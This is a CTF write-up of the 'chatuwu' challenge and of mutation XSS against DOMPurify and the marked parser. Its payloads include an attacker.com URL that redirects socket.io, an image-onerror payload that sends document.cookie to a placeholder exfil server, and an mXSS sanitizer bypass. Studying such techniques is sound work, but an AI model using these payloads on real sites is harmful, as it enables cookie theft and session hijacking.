# CHATUWU:

 Challenge Setup:
- A chat server with different rooms
- A bot to accept URLs and an admin bot
- The flag is stored in the admin bot's cookie

We get a room based on certain query parameters set in the URL. Going through the source code, you find a ternary operation which decides what happens in the room:

```javascript
socket.on('msg', function (msg) {
    let item = document.createElement('li'),
        msgtext = `[${new Date().toLocaleTimeString()}] ${msg.from}: ${msg.text}`;
    room === 'DOMPurify' && msg.isHtml ? item.innerHTML = msgtext : item.textContent = msgtext;
    messages.appendChild(item);
    window.scrollTo(0, document.body.scrollHeight);
});
```

## The Problems:
1. You need to set the room to 'DOMPurify' to be able to set `innerHTML`, but if you do that, the `msg` elements are sanitized by DOMPurify first before emitting. So you need to be able to set it to the 'textContent' room to not filter the payload.
2. There is an `isHtml` variable, set by the backend server, which also needs to be `true` to allow editing `innerHTML`.

## Initial Attempt:
Having multiple query parameters of the same name is actually valid in HTML. It's not defined in the HTML spec exactly how this should be handled, so different URL parsers handle it differently. Some, like PHP, create an array of all the values, some only take the last occurrence, or use some other custom implementation.

Here, the client-side check which uses `URLSearchParams(location.search)` takes the last value, and the server socket.io either takes the first value or maybe checks all values. Thus, if you have a URL like this:

```
http://0.0.0.0:58000/?&room=DOMPurify&nickname=guest1369&room=textContent
```

It will connect to room 'textContent' but `query.get("room")` will return 'DOMPurify', and that is then used to set the room, thus potentially allowing `innerHTML` access if the `isHtml` check was not there.

## The Actual Solution:
A completely different approach is required. The socket.io URL is set client-side by using `location.search`, which according to the spec just searches for the first '?' in the URL passed, and everything after that (including the '?') is returned as the query string.

We find the attack of using '@' in the URI. This works because as per the spec (RFC 3986, section 3.2.1), this format is a valid (but deprecated) URL:

```
<scheme>://<user>:<password>@<host>:<port>/<url-path>
```

By including an '@' symbol in the nickname parameter, the attackers create a URL that looks like this:

```
http://127.0.0.1:58000/?nickname=x@attacker.com/&room=DOMPurify
```

When this URL is processed by `io(/${location.search})`, it becomes:

```
io(/?nickname=x@attacker.com/&room=DOMPurify)
```

### Socket.IO's Interpretation:
Socket.IO sees this as a connection request to `attacker.com` with the path `/&room=DOMPurify`. It ignores everything before the '@' symbol, treating it as username information.

This crafted URL serves two purposes:
a) It makes Socket.IO connect to the attacker's server instead of the legitimate server.
b) It still includes `room=DOMPurify` as a query parameter, which is used by the client-side code to determine how to handle messages (using `innerHTML`).

Thus, we just set up a socket.io server of our own to accept the connection, send this kind of URL to the bot to make it go to our server, give an XSS payload for the admin bot like:

```html
<img src=x onerror="fetch('https://[exfil server]/'+btoa(document.cookie))">
```

And get the flag.

### Why "?&" was needed (a guess): 
It was the syntax required for `URLSearchParams()` to correctly set the query object to pass the ternary check.

--- 

# Mutated XSS:
Parsing HTML Content and Markdown

Parsing HTML content involves a lot of complex steps. There are a lot of edge cases and caveats with different rules for many specific tags. There is also error correction built into the parsers to, for example, fix missing closing tags. Thus, different parsers might implement the same HTML code in different ways and produce very different outputs. This can change the HTML multiple times depending on the code.
Markdown Parsers and HTML Sanitizers

Markdown is no different. A Markdown parser is basically an watered down HTML parser with all the different tags and options which is still very complex with extended features 
and custom implementations.

On top of these are HTML sanitizers which take in dirty HTML and sanitize it by turning it into code it considers safe. Popular HTML sanitizers work by:

  -   First rendering the HTML into a sandboxed environment and creating a DOM tree
  -   Deleting the harmful nodes
  -  Then creating an HTML string back from that modified DOM

This prevents bypassing by using complex encoding schemes or bypasses in case a blacklist is used by the sanitizer, because people are creative and blacklists are not secure.

So, all this together causes Mutated XSS attacks to work in cases where the HTML is parsed multiple times and the innerHTML is edited. 
So what we can do for this attack is put the XSS payload in a way which looks safe for the sanitizer but when parsed by another parser the payload gets executed after being rendered into some unsafe DOM.
Example of an Attack

Like in this challenge, the payload was inserted into the id of a tag so was not removed by DOMPurify but after parsing through the marked parser it turned into an XSS payload because the marked parser prioritized code blocks before HTML. That is, if it found code blocks \`\`, it transformed the string inside the code block into \<code> tags and then the rest of the HTML.

So what the exploit did was put the XSS payload in the id of an element but closed the block just after the opening quote, like this: 

```
`<p x="`<img src=x onerror=alert(1)>"></p>
```

DOMPurify would not remove anything as nothing looks malicious in this, the malicious thing is in the id which cannot cause damage. But the marked parser saw the \`, converted them to code blocks,
leaving the rest of the things after the second \` as normal HTML which could be executed, something like 

```
<p><code>&lt;p id=&quot;</code><img src=x onerror=alert(1)>&quot;&gt;</p></p>
```

thus mutating the HTML to get XSS.

There are also many other ways mXSS can occur. Like this researcher showed https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss how 
mXSS can occur because some tags allow certain elements while others don't.
It shows why mXSS is so difficult to catch because it utilises such edge cases to bypass the sanitizer.

